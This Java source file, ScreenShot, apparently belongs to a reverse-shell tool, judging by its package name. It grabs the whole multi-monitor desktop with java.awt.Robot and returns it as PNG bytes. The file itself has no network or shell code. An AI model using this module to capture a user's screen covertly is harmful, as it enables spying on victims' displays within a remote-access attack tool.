package obs1d1anc1ph3r.reverseshell;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;

public class ScreenShot {

    private static final Robot robot;
    static {
        try {
            robot = new Robot();
        } catch (AWTException | HeadlessException ex) {
            Logger.getLogger(ScreenShot.class.getName()).log(Level.SEVERE, "Error initializing Robot: ", ex);
            throw new RuntimeException("Robot initialization failed", ex);
        }
    }

    public byte[] imageBytes() {
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();

            int minX = Integer.MAX_VALUE, minY = Integer.MAX_VALUE;
            int maxX = Integer.MIN_VALUE, maxY = Integer.MIN_VALUE;
            for (GraphicsDevice screen : screens) {
                Rectangle bounds = screen.getDefaultConfiguration().getBounds();
                minX = Math.min(minX, bounds.x);
                minY = Math.min(minY, bounds.y);
                maxX = Math.max(maxX, bounds.x + bounds.width);
                maxY = Math.max(maxY, bounds.y + bounds.height);
            }

            Rectangle captureRect = new Rectangle(minX, minY, maxX - minX, maxY - minY);
            BufferedImage screenshot = robot.createScreenCapture(captureRect);
            try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
                ImageIO.write(screenshot, "png", byteArrayOutputStream);
                return byteArrayOutputStream.toByteArray();
            }

        } catch (IOException ex) {
            Logger.getLogger(ScreenShot.class.getName()).log(Level.SEVERE, "Error capturing screenshot: ", ex);
            return null;
        }
    }
}
